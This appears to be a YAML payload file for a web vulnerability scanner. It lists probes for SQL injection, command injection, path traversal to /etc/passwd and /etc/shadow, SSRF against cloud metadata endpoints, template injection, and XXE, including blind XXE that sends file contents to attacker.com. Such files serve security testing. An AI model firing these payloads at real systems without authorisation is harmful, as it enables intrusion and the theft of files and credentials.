missing_headers:
  - name: "Check CSP/XFO/HSTS"
    http_method: "GET"
    path: "/no-headers"
    payload: ""
cookie_flags:
  - name: "Check cookie flags"
    http_method: "GET"
    path: "/set-cookie"
    payload: ""
error_triggering:
  - name: "Template injection test"
    http_method: "GET"
    path: "/reflect"
    payload: "{{7*7}}"
  - name: "Expression language test"
    http_method: "GET"
    path: "/reflect"
    payload: "${7*7}"
  - name: "Path traversal test"
    http_method: "GET"
    path: "/reflect"
    payload: "../../../etc/passwd"
  - name: "Null reference test"
    http_method: "GET"
    path: "/reflect"
    payload: "null"
  - name: "Undefined variable test"
    http_method: "GET"
    path: "/reflect"
    payload: "undefined"
open_redirect:
  - name: "Basic external domain"
    http_method: "GET"
    path: "/redirect"
    payload: "https://evil.com"
  - name: "Protocol relative bypass"
    http_method: "GET"
    path: "/redirect"
    payload: "//evil.com"
  - name: "Backslash bypass"
    http_method: "GET"
    path: "/redirect"
    payload: "/\\evil.com"
  - name: "URL encoded bypass"
    http_method: "GET"
    path: "/redirect"
    payload: "%2f%2fevil.com"
sql_injection:
  # Error-based SQL injection payloads
  - name: "MySQL error-based"
    http_method: "GET"
    path: "/api/users"
    payload: "1'"
  - name: "PostgreSQL error-based"
    http_method: "GET"
    path: "/api/users"
    payload: "1'"
  - name: "SQL Server error-based"
    http_method: "GET"
    path: "/api/users"
    payload: "1'"
  - name: "Oracle error-based"
    http_method: "GET"
    path: "/api/users"
    payload: "1'"
  # Time-based blind SQL injection payloads
  - name: "MySQL time-based"
    http_method: "GET"
    path: "/api/users"
    payload: "1' AND SLEEP(5)--"
  - name: "PostgreSQL time-based"
    http_method: "GET"
    path: "/api/users"
    payload: "1' AND pg_sleep(5)--"
  - name: "SQL Server time-based"
    http_method: "GET"
    path: "/api/users"
    payload: "1'; WAITFOR DELAY '00:00:05'--"
  - name: "Oracle time-based"
    http_method: "GET"
    path: "/api/users"
    payload: "1' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(32),5)--"
  # Boolean-based blind SQL injection payloads
  - name: "Boolean true condition"
    http_method: "GET"
    path: "/api/users"
    payload: "1' AND '1'='1"
  - name: "Boolean false condition"
    http_method: "GET"
    path: "/api/users"
    payload: "1' AND '1'='2"
  # Bypass techniques
  - name: "URL encoded single quote"
    http_method: "GET"
    path: "/api/users"
    payload: "1%27"
  - name: "Double URL encoded"
    http_method: "GET"
    path: "/api/users"
    payload: "1%2527"
  - name: "SQL comment bypass"
    http_method: "GET"
    path: "/api/users"
    payload: "1'/**/OR/**/1=1--"
  - name: "Inline comment bypass"
    http_method: "GET"
    path: "/api/users"
    payload: "1'/*comment*/OR/*comment*/1=1--"
command_injection:
  # Unix command injection payloads with various separators
  - name: "Unix semicolon separator"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1; whoami"
  - name: "Unix pipe separator"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 | whoami"
  - name: "Unix ampersand separator"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 & whoami"
  - name: "Unix command substitution backticks"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 `whoami`"
  - name: "Unix command substitution dollar"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 $(whoami)"
  - name: "Unix newline separator"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1\nwhoami"
  # Windows command injection payloads
  - name: "Windows ampersand separator"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 & dir"
  - name: "Windows pipe separator"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 | type"
  - name: "Windows double ampersand"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 && dir"
  - name: "Windows command separator"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 | type C:\\Windows\\System32\\drivers\\etc\\hosts"
  # Blind command injection payloads (time-based)
  - name: "Unix blind sleep 10"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1; sleep 10"
  - name: "Unix blind sleep 5"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 | sleep 5"
  - name: "Unix blind sleep with pipe"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 & sleep 10"
  - name: "Unix blind sleep backticks"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 `sleep 10`"
  - name: "Unix blind sleep dollar"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 $(sleep 10)"
  - name: "Windows blind timeout"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 & timeout /t 10"
  - name: "Windows blind ping delay"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 | ping -n 10 127.0.0.1"
  # Command output detection payloads
  - name: "Unix id command"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1; id"
  - name: "Unix uname command"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1; uname -a"
  - name: "Unix pwd command"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1; pwd"
  - name: "Unix ls command"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1; ls -la"
  - name: "Windows ver command"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 & ver"
  - name: "Windows hostname command"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 & hostname"
  - name: "Windows whoami command"
    http_method: "GET"
    path: "/api/ping"
    payload: "127.0.0.1 & whoami"
path_traversal:
  # Basic Unix path traversal payloads
  - name: "Unix basic traversal etc/passwd"
    http_method: "GET"
    path: "/api/download"
    payload: "../../../etc/passwd"
  - name: "Unix basic traversal etc/shadow"
    http_method: "GET"
    path: "/api/download"
    payload: "../../../etc/shadow"
  - name: "Unix basic traversal etc/hosts"
    http_method: "GET"
    path: "/api/download"
    payload: "../../../etc/hosts"
  - name: "Unix basic traversal with more levels"
    http_method: "GET"
    path: "/api/download"
    payload: "../../../../../../etc/passwd"
  # Basic Windows path traversal payloads
  - name: "Windows basic traversal win.ini"
    http_method: "GET"
    path: "/api/download"
    payload: "..\\..\\..\\..\\windows\\win.ini"
  - name: "Windows basic traversal system.ini"
    http_method: "GET"
    path: "/api/download"
    payload: "..\\..\\..\\..\\windows\\system32\\config\\system"
  - name: "Windows basic traversal hosts"
    http_method: "GET"
    path: "/api/download"
    payload: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
  # URL encoded traversal payloads
  - name: "URL encoded single level"
    http_method: "GET"
    path: "/api/download"
    payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  - name: "URL encoded with mixed encoding"
    http_method: "GET"
    path: "/api/download"
    payload: "..%2f..%2f..%2fetc%2fpasswd"
  - name: "URL encoded backslash Windows"
    http_method: "GET"
    path: "/api/download"
    payload: "..%5c..%5c..%5cwindows%5cwin.ini"
  # Double URL encoded traversal payloads
  - name: "Double encoded forward slash"
    http_method: "GET"
    path: "/api/download"
    payload: "..%252f..%252f..%252fetc%252fpasswd"
  - name: "Double encoded backslash"
    http_method: "GET"
    path: "/api/download"
    payload: "..%255c..%255c..%255cwindows%255cwin.ini"
  # Null byte injection for extension bypass
  - name: "Null byte with passwd"
    http_method: "GET"
    path: "/api/download"
    payload: "../../../etc/passwd%00.txt"
  - name: "Null byte with win.ini"
    http_method: "GET"
    path: "/api/download"
    payload: "..\\..\\..\\windows\\win.ini%00.txt"
  - name: "Null byte encoded"
    http_method: "GET"
    path: "/api/download"
    payload: "../../../etc/passwd%2500.txt"
  # Unicode and other encoding variants
  - name: "Unicode encoded traversal"
    http_method: "GET"
    path: "/api/download"
    payload: "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
  - name: "UTF-8 encoded traversal"
    http_method: "GET"
    path: "/api/download"
    payload: "..%e2%80%a5..%e2%80%a5etc%2fpasswd"
  # Alternative traversal sequences
  - name: "Alternative forward slash"
    http_method: "GET"
    path: "/api/download"
    payload: "....//....//etc/passwd"
  - name: "Alternative backslash"
    http_method: "GET"
    path: "/api/download"
    payload: "....\\\\....\\\\windows\\\\win.ini"
  - name: "Mixed slashes"
    http_method: "GET"
    path: "/api/download"
    payload: "..\\..//..\\etc/passwd"
ssrf:
  # Internal IP addresses
  - name: "Localhost IPv4"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://127.0.0.1:8080"
  - name: "Localhost IPv4 alternative"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://127.0.0.1/"
  - name: "Localhost IPv6"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://[::1]:8080"
  - name: "AWS metadata endpoint"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://169.254.169.254/latest/meta-data/"
  - name: "AWS metadata instance-id"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://169.254.169.254/latest/meta-data/instance-id"
  - name: "GCP metadata endpoint"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://169.254.169.254/computeMetadata/v1/"
  - name: "Azure metadata endpoint"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  - name: "Private IP range 10.x"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://10.0.0.1:8080"
  - name: "Private IP range 192.168.x"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://192.168.1.1:8080"
  - name: "Private IP range 172.16-31.x"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://172.16.0.1:8080"
  # Internal hostnames
  - name: "Localhost hostname"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://localhost:8080"
  - name: "Localhost hostname no port"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://localhost/"
  - name: "Internal hostname"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://internal:8080"
  - name: "Metadata hostname"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://metadata:8080"
  - name: "Local domain"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://local:8080"
  # Protocol handlers
  - name: "File protocol handler"
    http_method: "GET"
    path: "/api/fetch"
    payload: "file:///etc/passwd"
  - name: "File protocol Windows"
    http_method: "GET"
    path: "/api/fetch"
    payload: "file:///C:/Windows/win.ini"
  - name: "Gopher protocol"
    http_method: "GET"
    path: "/api/fetch"
    payload: "gopher://127.0.0.1:8080"
  - name: "Dict protocol"
    http_method: "GET"
    path: "/api/fetch"
    payload: "dict://127.0.0.1:8080"
  - name: "LDAP protocol"
    http_method: "GET"
    path: "/api/fetch"
    payload: "ldap://127.0.0.1:389"
  # URL encoded variants
  - name: "URL encoded localhost"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://%6c%6f%63%61%6c%68%6f%73%74:8080"
  - name: "URL encoded 127.0.0.1"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://%31%32%37%2e%30%2e%30%2e%31:8080"
  # IPv6 variants
  - name: "IPv6 localhost"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://[::1]:8080"
  - name: "IPv6 localhost alternative"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://[0:0:0:0:0:0:0:1]:8080"
  # Bypass techniques
  - name: "Octal encoding"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://0177.0.0.1:8080"
  - name: "Decimal encoding"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://2130706433:8080"
  - name: "Hex encoding"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://0x7f.0x0.0x0.0x1:8080"
  - name: "Domain bypass with @"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://example.com@127.0.0.1:8080"
  - name: "Domain bypass with #"
    http_method: "GET"
    path: "/api/fetch"
    payload: "http://example.com#127.0.0.1:8080"
xxe:
  # Classic XXE file disclosure payloads
  - name: "Classic XXE /etc/passwd"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <foo>&xxe;</foo>
  - name: "Classic XXE /etc/hostname"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
      <foo>&xxe;</foo>
  - name: "Classic XXE Windows win.ini"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
      <foo>&xxe;</foo>
  - name: "Classic XXE /etc/shadow"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
      <foo>&xxe;</foo>
  # XXE SSRF payloads
  - name: "XXE SSRF localhost"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">]>
      <foo>&xxe;</foo>
  - name: "XXE SSRF internal network"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:8080">]>
      <foo>&xxe;</foo>
  # Blind XXE out-of-band payloads
  - name: "Blind XXE parameter entity"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;]>
      <foo>test</foo>
  - name: "Blind XXE with file read"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [
      <!ENTITY % file SYSTEM "file:///etc/passwd">
      <!ENTITY % xxe SYSTEM "http://attacker.com/?%file;">
      %xxe;
      ]>
      <foo>test</foo>
  - name: "Blind XXE with error-based"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [
      <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
      %remote;
      ]>
      <foo>&error;</foo>
  # XXE with different encodings
  - name: "XXE UTF-16 encoding"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-16"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <foo>&xxe;</foo>
  # XXE with CDATA wrapper
  - name: "XXE with CDATA"
    http_method: "POST"
    path: "/api/upload"
    payload: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
      <!ENTITY wrapper "<![CDATA[&xxe;]]>">
      ]>
      <foo>&wrapper;</foo>
ssti:
  # Jinja2 template injection payloads
  - name: "Jinja2 basic math"
    http_method: "GET"
    path: "/api/render"
    payload: "{{7*7}}"
  - name: "Jinja2 string multiplication"
    http_method: "GET"
    path: "/api/render"
    payload: "{{7*'7'}}"
  - name: "Jinja2 config access"
    http_method: "GET"
    path: "/api/render"
    payload: "{{config}}"
  - name: "Jinja2 self reference"
    http_method: "GET"
    path: "/api/render"
    payload: "{{self}}"
  # Twig template injection payloads
  - name: "Twig basic math"
    http_method: "GET"
    path: "/api/render"
    payload: "{{7*7}}"
  - name: "Twig string concatenation"
    http_method: "GET"
    path: "/api/render"
    payload: "{{'7'*7}}"
  - name: "Twig _self"
    http_method: "GET"
    path: "/api/render"
    payload: "{{_self}}"
  # Freemarker template injection payloads
  - name: "Freemarker basic math"
    http_method: "GET"
    path: "/api/render"
    payload: "${7*7}"
  - name: "Freemarker expression"
    http_method: "GET"
    path: "/api/render"
    payload: "#{7*7}"
  - name: "Freemarker class access"
    http_method: "GET"
    path: "/api/render"
    payload: "${.vars.getClass()}"
  # Velocity template injection payloads
  - name: "Velocity basic math"
    http_method: "GET"
    path: "/api/render"
    payload: "#set($x=7*7)$x"
  - name: "Velocity class access"
    http_method: "GET"
    path: "/api/render"
    payload: "$class"
  # Smarty template injection payloads
  - name: "Smarty basic math"
    http_method: "GET"
    path: "/api/render"
    payload: "{7*7}"
  - name: "Smarty PHP code"
    http_method: "GET"
    path: "/api/render"
    payload: "{php}echo 7*7;{/php}"
  # Mako template injection payloads
  - name: "Mako basic math"
    http_method: "GET"
    path: "/api/render"
    payload: "${7*7}"
  - name: "Mako Python code"
    http_method: "GET"
    path: "/api/render"
    payload: "<% 7*7 %>"
  # Handlebars template injection payloads
  - name: "Handlebars basic"
    http_method: "GET"
    path: "/api/render"
    payload: "{{7*7}}"
  # ERB (Ruby) template injection payloads
  - name: "ERB basic math"
    http_method: "GET"
    path: "/api/render"
    payload: "<%= 7*7 %>"
  - name: "ERB code execution"
    http_method: "GET"
    path: "/api/render"
    payload: "<% 7*7 %>"
  # JSP template injection payloads
  - name: "JSP expression"
    http_method: "GET"
    path: "/api/render"
    payload: "${7*7}"
  - name: "JSP scriptlet"
    http_method: "GET"
    path: "/api/render"
    payload: "<% 7*7 %>"
  # ASP.NET template injection payloads
  - name: "ASP.NET expression"
    http_method: "GET"
    path: "/api/render"
    payload: "<%= 7*7 %>"
  - name: "ASP.NET code block"
    http_method: "GET"
    path: "/api/render"
    payload: "<% 7*7 %>"
